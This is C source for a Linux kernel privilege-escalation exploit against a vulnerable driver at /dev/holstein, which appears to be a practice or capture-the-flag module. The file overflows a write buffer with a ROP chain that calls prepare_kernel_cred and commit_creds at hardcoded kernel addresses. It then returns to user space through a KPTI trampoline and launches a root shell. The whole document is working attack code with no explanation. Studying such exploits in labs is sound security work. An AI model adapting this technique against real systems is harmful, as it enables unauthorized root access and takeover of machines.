#define _GNU_SOURCE
#include <fcntl.h>
#include <poll.h>
#include <sched.h>
#include <signal.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <sys/syscall.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <unistd.h>

typedef uint64_t u64;
#define VULN "/dev/holstein"
#define offset 16;
int global_fd;
u64 cookie;
#define prepare_kernel_cred 0xffffffff8106e240
#define commit_creds 0xffffffff8106e390
#define rop_pop_rdi 0xffffffff8127bbdc
#define rop_pop_rcx 0xffffffff8132cdd3
#define rop_mov_rdi_rax_rep_movsq 0xffffffff8160c96b
#define rop_swapgs 0xffffffff8160bf7e
#define rop_iretq 0xffffffff810202af
#define tramp 0xffffffff81800e26;

void open_kn() {
  global_fd = open(VULN, O_RDWR);
  if (global_fd < 0) {
    exit(-1);
  } else {
    puts("[+] success opening!!!");
  }
}
unsigned long user_cs, user_ss, user_rflags, user_sp;

/*struct sigaction sigact;


void register_sigsegv() {
  puts("[+] Registering default action upon encountering a SIGSEGV!");
  sigact.sa_handler = spawn_shell;
  sigemptyset(&sigact.sa_mask);
  sigact.sa_flags = 0;
  sigaction(SIGSEGV, &sigact, (struct sigaction *)NULL);
}*/

void save_state() {
  __asm__(".intel_syntax noprefix;"
          "mov user_cs, cs;"
          "mov user_ss, ss;"
          "mov user_sp, rsp;"
          "pushf;"
          "pop user_rflags;"
          ".att_syntax;");
  puts("[*] Saved state");
}
void get_shell(int signal) {
  if (getuid() == 0) {
    printf("uid: %d ,ngon\n", getuid());
    system("/bin/sh");
  } else {
    printf("chim cut :(\n");
    exit(-1);
  }
}

u64 user_rip = (u64)get_shell;
void write_kn() {
  char payload[0x500];
  memset(payload, 'a', 0x408);
  u64 *chain = (u64 *)&payload[0x408];
  *chain++ = rop_pop_rdi;
  *chain++ = 0x0;
  *chain++ = prepare_kernel_cred;
  *chain++ = rop_pop_rcx;
  *chain++ = 0;
  *chain++ = rop_mov_rdi_rax_rep_movsq;
  *chain++ = commit_creds;
  *chain++ = tramp;
  *chain++ = 0;
  *chain++ = 0;
  *chain++ = user_rip;
  *chain++ = user_cs;
  *chain++ = user_rflags;
  *chain++ = user_sp;
  *chain++ = user_ss;
  u64 data = write(global_fd, payload, sizeof(payload));
  puts("[+] write success!!!");
}

int main() {
  save_state();
  // register_sigsegv();
  signal(SIGSEGV, get_shell);
  open_kn();
  write_kn();
  puts("i don't think here...");
}